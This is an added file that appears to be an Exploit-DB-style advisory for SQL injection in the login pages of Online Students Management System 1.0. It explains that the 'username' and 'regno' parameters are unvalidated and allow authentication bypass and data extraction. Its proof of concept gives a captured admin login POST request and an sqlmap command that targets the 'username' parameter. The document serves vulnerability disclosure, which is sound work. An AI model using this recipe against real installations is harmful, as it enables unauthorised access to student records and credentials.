@@ -1,0 +1,51 @@
+# Title: Online Students Management System 1.0 - 'username' SQL Injections
+# Exploit Author: George Tsimpidas
+# Date: 2020-10-09
+# Vendor Homepage: www.sourcecodester.com
+# Software Link:
+https://www.sourcecodester.com/sites/default/files/download/janobe/studentrecord_0.zip
+# Version : 1.0
+# Tested on: Ubuntu 18.04.5 LTS (Bionic Beaver)
+# Category: Webapp
+
+# Description
+
+The files index.php on the main login page, and the index.php on the
+/admin/ login page does not perform input validation on the regno
+and username parameters. An attacker can send malicious input in the post
+request to http://localhost/index.php or either
+http://localhost/admin/index.php and bypass authentication, extract
+sensitive information etc.
+
+#POC
+
+1) Navigate to the admin login page
+
+Example:
+
+http://localhost/admin/index.php
+
+2) Fill in dummy values for 'username' and 'password' fields and send the
+request via an HTTP intercept tool
+
+3) Save the request to file. Example, student_record_sqli.req
+
+POST /admin/index.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101
+Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 32
+Origin: http://localhost
+DNT: 1
+Connection: close
+
+username=admin&password=dummy
+
+4) Run SQLmap on the file,
+
+sqlmap -r student_record_sqli.req --dbms=mysql --threads=10 -p username
